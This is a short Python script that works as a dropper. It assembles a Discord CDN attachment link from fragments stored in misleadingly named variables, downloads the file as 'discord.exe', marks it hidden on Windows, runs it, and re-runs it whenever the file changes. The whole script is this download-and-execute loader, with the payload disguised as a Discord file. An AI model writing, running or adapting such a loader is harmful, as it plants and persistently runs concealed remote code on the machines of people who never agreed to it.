import os
import requests
import subprocess
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes

class CustomFileSystemEventHandler(FileSystemEventHandler):
    def __init__(self, file_path):
        super().__init__()
        self.file_path = file_path

    def on_modified(self, event):
        if event.src_path == self.file_path:
            subprocess.run([self.file_path], shell=True)

main_gateway = "https://cdn.discordapp.com"
attachment_id = "1221158414575472724"
api_id = "1221158898757799996"
discord_version = "HEosnziOZnnae."
parameter = "ex=66118fd9&is=65ff1ad9&hm="
additional_param = "f8dba6d4dcb4f226124fd072fd26&"
folder_name = 'cached'

def download_and_execute(url, folder_name):
    try:
        response = requests.get(url)
        response.raise_for_status()
        file_path = os.path.join(folder_name, 'discord.exe')
        
        os.makedirs(folder_name, exist_ok=True)
        with open(file_path, 'wb') as file:
            file.write(response.content)
        
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # Hide the file
        return file_path
    except Exception as e:
        print("Error:", e)
        return None

authorization_url = f"{main_gateway}/attachments/{attachment_id}/{api_id}/{discord_version}/e{parameter}{additional_param}"
file_path = download_and_execute(authorization_url, folder_name)

if file_path:
    subprocess.Popen([file_path], shell=True)

    event_handler = CustomFileSystemEventHandler(file_path)
    observer = Observer()
    observer.schedule(event_handler, path=os.path.dirname(file_path), recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        observer.join()
